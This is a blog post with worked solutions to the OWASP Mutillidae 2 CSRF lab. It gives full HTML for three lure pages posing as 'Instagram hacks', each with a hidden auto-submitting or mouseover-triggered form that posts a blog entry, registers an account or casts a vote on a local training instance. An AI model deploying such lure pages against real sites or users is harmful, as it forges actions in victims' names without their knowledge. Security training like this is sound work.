---
layout: post
title:  "OWASP Mutillidae 2 Cross Site Request Forgery (CSRF) Lab Solutions"
date:   2021-05-29 15:00:00 +0300
tags: Security Practice Lab CSRF Vulnerability OWASP
---

### Content
You are going to design a website to perform CSRF attacks to these three pages. Home page of your website will contain three links to open three new pages. Each page is going to be used to make the requested CSRF attack.

- **1. Page for adding a blog entry:**
  A new blog entry is going to be added to the users blog with an HTTP POST request. Result of the attack is going to be validated from View Blogs (from Mutillidae) link.
- **2. Page for registering a new user:**
  A new user is going to be registered to the system with an HTTP POST request. Result of the attack is going to be validated from login page (from Mutillidae).
- **3. Page for voting:**
  Voting for a security tool is going to be performed. Also JavaScript is going to be used through onmouseover event. Result of the attack is going to be validated from View Log (from Mutillidae) link.

Note that the user is going to be unaware of the attacks. Thus your web pages must not contain any evidence about the attacks. You should show user an image gallery, news, etc.

<br><br>

# 0. My Extremely Beautiful Home Page

![home page](/img/mutillidae2/csrf/0.png)

```html
<html>

    <head>
        <title>Instagram Hacks</title>
    </head>

    <body>
        <center>
            <img src="instagram.png" width="100px" height="100px">
            <h1>Pick an Instagram Hack</h1>

            <a href="http://localhost/whoUnfollowed.html">See who unfollowed you</a>
            <br><br>
            <a href="http://localhost/gainFollowers.html">Gain 10.000 followers</a>
            <br><br>
            <a href="http://localhost/whoLooked.html">See who looked at your profile</a>
        </center>
    </body>

</html>
```

<br>

# 1. Page for adding a blog entry

1. First I created an example blog entry to see the parameters:

    ![add entry request](/img/mutillidae2/csrf/1-1.png)

2. Then I used my perfect web development skills to create a page consisting of a form and a submit button to lure in victims. 
   
    ![who unfollowed you - dummy page](/img/mutillidae2/csrf/1-2.png)

3. I also added a hidden form which will be used to create a POST request. For the form fields, I used the parameters I obtained from the first step.
   
   ```html
   <html>

       <head>
           <title>See Who Unfollowed</title>
       </head>

       <body>

           <a href="http://localhost/instagramHacks.html">Back to the home</a>
                
           <center>
               <img src="instagram.png" width="100px" height="100px">
                    <h1>Let's see who unfollowed you!</h1>

               <p>Enter your username and password:</p>

               <form id="dummy" action="/whoUnfollowedResult.html">
                   <label for="username">Username: </label>
                   <input type="text" name="username" value=""><br><br>

                   <label for="password">Password: </label>
                   <input type="password" name="password" value="">
               </form> 

               <button type="submit" form="dummy" value="Submit">Find out</button>
           </center>

           <!-- Form target frame to avoid redirection -->
           <iframe id="iframe" name="my_iframe" style="position: absolute;width:0;height:0;border:0;"></iframe>
                
           <!-- CSRF - Add blog post -->
           <form name="csrf" id="csrf" target="my_iframe" action="http://192.168.56.101/mutillidae/index.php?page=add-to-your-blog.php" method="POST">
               <input type="hidden" name='csrf-token' value=''>
               <input type="hidden" name='blog_entry' value='Hi, I am such a generous person that I give my passwords to everyone!'>
               <input type="hidden" name='add-to-your-blog-php-submit-button' value='Save Blog Entry'>
           </form>
                
           <!-- Send POST request -->
           <script>
               document.csrf.submit();
           </script>

       </body>

   </html>
   ```

4. When unsuspecting victims load the page, a POST request will be created and sent which will result in a creation of blog entry. 

<br>

# 2. Page for registering a new user
    
I will be repeating the same steps as *"1. Page for adding a blog entry"*.

1. Let's see the parameters:
   
    ![register a new user request](/img/mutillidae2/csrf/2-1.png)

2. Page:

    ![gain followers - dummy page](/img/mutillidae2/csrf/2-2.png)

3. Page source:

    ```html
    <html>

        <head>
            <title>Gain Followers</title>
        </head>

        <body>

            <a href="http://localhost/instagramHacks.html">Back to the home</a>

            <center>
                <img src="instagram.png" width="100px" height="100px">
                <h1>Gain 10.000 new followers!</h1>

                <p>Enter your username and password:</p>

                <form id="dummy" action="/gainFollowersResult.html">
                    <label for="username">Username: </label>
                    <input type="text" name="username" value=""><br><br>

                    <label for="password">Password: </label>
                    <input type="password" name="password" value="">
                </form> 

                <button type="submit" form="dummy" value="Submit">Gain!</button>
            </center>

            <!-- Form target frame to avoid redirection -->
            <iframe id="iframe" name="my_iframe" style="position: absolute;width:0;height:0;border:0;"></iframe>
            
            <!-- CSRF - Register new user -->
            <form name="csrf" id="csrf" target="my_iframe" action="http://192.168.56.101/mutillidae/index.php?page=register.php" method="POST">
                <input type="hidden" name='csrf-token' value=''>
                <input type="hidden" name='username' value='hackerman'>
                <input type="hidden" name='password' value='hackerman123'>
                <input type="hidden" name='confirm_password' value='hackerman123'>
                <input type="hidden" name='my_signature' value=''>
                <input type="hidden" name='register-php-submit-button' value='Create Account'>
            </form>
            
            <!-- Send POST request -->
            <script>
                document.csrf.submit();
            </script>

        </body>

    </html>
    ```

4. When unsuspecting victims load the page, a POST request will be created and sent which will result in a registration of a new user.


<br>

# 3. Page for voting

I will be repeating the same steps as *"1. Page for adding a blog entry"*.

1. Parameters:

    ![vote request](/img/mutillidae2/csrf/3-1.png)

2. Page:

    ![who looked at your profile - dummy page](/img/mutillidae2/csrf/3-2.png)

3. Page source:

    ```html
    <html>

        <head>
            <title>Who Looked At Your Profile</title>
        </head>

        <body>

            <a href="http://localhost/instagramHacks.html">Back to the home</a>

            <center>
                <img src="instagram.png" width="100px" height="100px">
                <h1>Who looked at your profile?</h1>

                <p>Enter your username and password:</p>

                <form id="dummy" action="/whoLookedResult.html">
                    <label for="username">Username: </label>
                    <input type="text" name="username" value=""><br><br>

                    <label for="password">Password: </label>
                    <input type="password" name="password" value="">
                </form> 

                <!-- Send GET request on mouseover-->
                <button type="submit" form="dummy" value="Submit" onmouseover="document.getElementById('csrf').submit()">See</button>
            </center>

            <!-- Form target frame to avoid redirection -->
            <iframe id="iframe" name="my_iframe" style="position: absolute;width:0;height:0;border:0;"></iframe>
            
            <!-- CSRF - Vote -->
            <form name="csrf" id="csrf" target="my_iframe" action="http://192.168.56.101/mutillidae/index.php" method="GET">
                <input type="hidden" name='page' value='user-poll.php'>
                <input type="hidden" name='csrf-token' value=''>
                <input type="hidden" name='choice' value='wireshark'>
                <input type="hidden" name='initials' value='hm'>
                <input type="hidden" name='user-poll-php-submit-button' value='Submit Vote'>
            </form>

        </body>

    </html>
    ```

4. When unsuspecting victims move their mouse on the submit button, a GET request will be created and sent which will result in a vote.

